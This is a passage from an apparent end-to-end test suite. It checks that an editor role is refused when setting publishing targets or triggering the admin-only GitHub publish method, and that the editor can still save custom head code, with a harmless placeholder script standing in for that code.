  expect(aimed.status()).toBe(403)
  expect((await aimed.json()).error).toContain('settings.publishing')

  // nothing landed
  const stored = (await (await admin.get(`/api/store?keys=${MAIN}`)).json()) as Record<string, string>
  expect(JSON.parse(stored[MAIN]).settings.publishing).toBeUndefined()

  // ...and the method itself is admin-only, so a target an admin DID set is
  // still not an editor's to fire
  const fired = await editor.post('/api/published?method=github', { data: JSON.parse(mainBody) })
  expect(fired.status()).toBe(403)
  expect((await fired.json()).error).toContain('admin')

  // a zip is still theirs, and so is custom code
  const withCode = JSON.parse(mainBody)
  withCode.settings.customCode = { head: '<script>ok()</script>' }
  expect((await editor.put(`/api/store/${MAIN}`, { data: JSON.stringify(withCode) })).status()).toBe(200)

  await admin.dispose()
  await editor.dispose()
})
